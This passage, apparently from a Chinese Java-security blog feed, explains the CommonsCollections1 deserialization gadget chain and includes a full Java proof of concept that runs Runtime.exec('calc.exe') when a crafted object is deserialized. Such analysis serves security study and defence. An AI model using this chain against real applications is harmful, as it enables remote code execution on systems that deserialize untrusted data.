src="https://img.katck.com/images/2023/05/07/62062f6b69cae20343077fd7d737555f.png" alt="image-20230507105548700"></p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections1</title>
    <link href="/2023/05/06/CommonsCollections1/"/>
    <url>/2023/05/06/CommonsCollections1/</url>
    
    <content type="html"><![CDATA[<h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h4 id="ysoserial-Gadget"><a href="#ysoserial-Gadget" class="headerlink" title="ysoserial Gadget"></a>ysoserial Gadget</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">Map(Proxy).entrySet()</span><br><span class="hljs-comment">AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">LazyMap.get()</span><br><span class="hljs-comment">ChainedTransformer.transform()</span><br><span class="hljs-comment">ConstantTransformer.transform()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Class.getMethod()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.getRuntime()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.exec()</span><br><span class="hljs-comment">Requires:</span><br><span class="hljs-comment">commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="CommonsCollection"><a href="#CommonsCollection" class="headerlink" title="CommonsCollection"></a>CommonsCollection</h3><blockquote><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p></blockquote><p>CommonsCollection实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。<strong>该类可以在一个元素被添加到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化的时候作为参数传入。</strong>这也是这个利用链的核心。</p><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformer是一个接口，它只有一个待实现的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Apache Commons Collections 已经内置了一些常见的Transformer</p><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>通过<code>TransformedMap.decorate()</code>方法，可以获得一个<code>TransformedMap</code>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">tansformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, keyTransformer, valueTransformer);<br></code></pre></td></tr></table></figure><p>当TransformedMap内的key或value发生变换时，就会触发相应Transformer的<code>transform()</code>方法。</p><p>还可以使用Transformer数组构造成ChainedTransformer。当触发时，ChainedTransformer可以按顺序调用一系列变换。</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer实现了<code>transform</code>方法，它的过程就是在构造函数中传入一个对象，并用<code>transform</code>方法将这个对象再返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br><span class="hljs-built_in">super</span>();<br>iConstant = constantToReturn;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br><span class="hljs-keyword">return</span> iConstant;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer也是实现了Transformer接口的一个类，它的作用是将内部的多个Transformer串起来。</p><p>前一个回调返回的结果，作为后一个回调的参数传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br><span class="hljs-built_in">super</span>();<br>iTransformers = transformers;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>object = iTransformers[i].transform(object);<br>&#125;<br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer实现了<code>transform</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(<span class="hljs-built_in">this</span>.iMethodName, <span class="hljs-built_in">this</span>.iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-built_in">this</span>.iArgs);<br>        &#125; ...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用Java反射机制调用了input对象的一个方法，而方法名时实例化InvokerTransformer时传入的<code>iMethodName</code>成员变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说这段反射代码中调用的方法名和Class对象都是可控的。我们可以构造一个恶意的Transformer链，借用<code>InvokerTransformer.transform()</code>执行任意命令</p><h2 id="利用Transformer链执行命令"><a href="#利用Transformer链执行命令" class="headerlink" title="利用Transformer链执行命令"></a>利用Transformer链执行命令</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调试跟踪一下整个过程</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">Map</span>.put() =&gt; TransformedMap.transformValue() =&gt; ChainedTransformer =&gt; ConstantTransformer.transform() =&gt; InvokerTransformer.transform() =&gt; Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="通过反序列化触发Transformer链"><a href="#通过反序列化触发Transformer链" class="headerlink" title="通过反序列化触发Transformer链"></a>通过反序列化触发Transformer链</h2><p>如果Java应用没有对传入的序列化数据进行安全性检查，我们可以将恶意的<code>TransformedMap</code>序列化后，远程提交给Java应用，即可成功执行远程命令。</p><p>上面通过<code>Map.put()</code>触发了整个利用链，但如何实现自动触发呢？</p><p>在进行序列化的时，我们会调用<code>ObjectInputStream</code>类的<code>readObject()</code>方法，如果被反序列化的类重写了<code>readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code>readObject()</code>方法。</p><p>如果有某个类，重写了<code>readObject()</code>方法，并且它的<code>readObject()</code>方法中对Map类型的变量进行了键值修改操作，并且这个Map是可控的，就可以触发利用链。</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>于是ysoserial找到了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类</p><p>看一下它的<code>readObject()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    var1.defaultReadObject();<br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var2 = AnnotationType.getInstance(<span class="hljs-built_in">this</span>.type);<br>    &#125; <span class="hljs-keyword">catch</span> ...<br><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.memberTypes();<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.entrySet().iterator();<br><br>    <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>        Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> (Map.Entry)var4.next();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (String)var5.getKey();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> (Class)var3.get(var6);<br>        <span class="hljs-keyword">if</span> (var7 != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var5.getValue();<br>            <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                var5.setValue((<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>它的成员变量<code>memberValue</code>为<code>Map&lt;String, Object&gt;</code> 类型并且可控，<code>var5.setValue</code>  对Map类型的变量进行了键值操作。完美，非常符合我们的要求。</p><p>我们可以实例化一个<code>AnnotationInvocationHandler</code>类，将其成员变量<code>memberValue</code>设置为精心构造的<code>TransformedMap</code>对象。</p><p>然后将其序列化，提交给未经安全检测的应用。Java应用在进行反序列化操作时，则会触发<code>TransformedMap</code>的变换函数，执行预设的命令。</p><h4 id="自动触发Transformer利用链"><a href="#自动触发Transformer利用链" class="headerlink" title="自动触发Transformer利用链"></a>自动触发Transformer利用链</h4><p>因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是JDK内部的类，不能通过new来实例化。但可以使用反射获取它的构造方法，修改访问权限，再调用构造方法实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, outerMap);<br></code></pre></td></tr></table></figure><p>需要注意的是，<code>java.lang.Runtime</code>并不能序列化，因为它没有实现<code>java.io.Serializable</code>接口。不过我们可以通过反射的方式来获取当前上下文的Runtime对象，而不直接实例化这个类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) m.invoke(<span class="hljs-literal">null</span>);<br>r.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>写成Transformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                           <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                           &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br></code></pre></td></tr></table></figure><h4 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oss.writeObject(obj);<br>        oss.close();<br><br>        <span class="hljs-comment">// 反序列</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bari</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bari);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是并不能执行成功，调试一下会发现。<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject()</code>方法中的var7为null，无法触发<code>var.setValue()</code>，也就无法触发Transformer利用链</p><p><img src="https://img.katck.com/images/2023/05/06/68d35067077fa12091b7ffbc2ae6c7e9.png" alt="image-20230425214703430"></p><p>查了网上大部分介绍cc1链的文章都没有说清楚这是为啥。P神的Java安全漫谈中说这里用了java的注释相关技术（具体是啥我也不清楚，记住满足if语句需要下面的两个条件就行）：</p><ul><li><code>sun.reflect.annotation.AnnotationInvocationHandler</code>构造函数的第一个参数必须是<code>Annotation</code>的子类，且其中必须有至少一个方法</li><li>被<code>TransformedMap.decorate</code>修饰的Map中必须有一个键名为<code>Annotation</code>子类的方法名的元素</li></ul><p>而<code>Retention</code>正好有一个方法名为<code>value</code>，所以可以用<code>Retention.class</code>，真好可以满足这两个条件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, outerMap);<br></code></pre></td></tr></table></figure><p>在实例化的时候已经使用了<code>Retention.class</code>，为了满足第二个条件，我们需要给Map放入一个是<code>value</code>的元素</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">innerMap.<span class="hljs-keyword">put</span>(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>)<br></code></pre></td></tr></table></figure><p>然后就是成功触发</p><p><img src="https://img.katck.com/images/2023/05/06/edb20387ace6149c6d3563d2212ad5bb.png" alt="image-20230425215845242"></p><h4 id="整体利用链"><a href="#整体利用链" class="headerlink" title="整体利用链"></a>整体利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>transform<span class="hljs-constructor">Value()</span> =&gt; ChainedTransformer =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><p>其实就是最开始触发的方法变了，但这可以自动触发，非常关键。</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>ysoserial中使用的是<code>LazyMap.get()</code>来触发<code>ChainedTransformer.transform()</code></p><p><strong>cc1部分Gadget：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* </span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">Map(Proxy).entrySet()</span><br><span class="hljs-comment">AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">LazyMap.get()</span><br><span class="hljs-comment">ChainedTransformer.transform()</span><br></code></pre></td></tr></table></figure><p>LazyMap的漏洞触发点是在get方法中执行的<code>factory.transform</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是在<code>AnnotationInvocationHandler</code>的readObject方法中并没有直接调用Map的get方法</p><p>ysoserial找到了<code>AnnotationInvocationHandler.invoke()</code>，会自动调用get</p><p><img src="https://img.katck.com/images/2023/05/06/b2098071e0942e2bc1d9a6f157782f22.png" alt="image-20230506151225011"></p><p>但是如何调用<code>AnnotationInvocationHandler.invoke()</code>呢？</p><p>ysoserial利用了<a 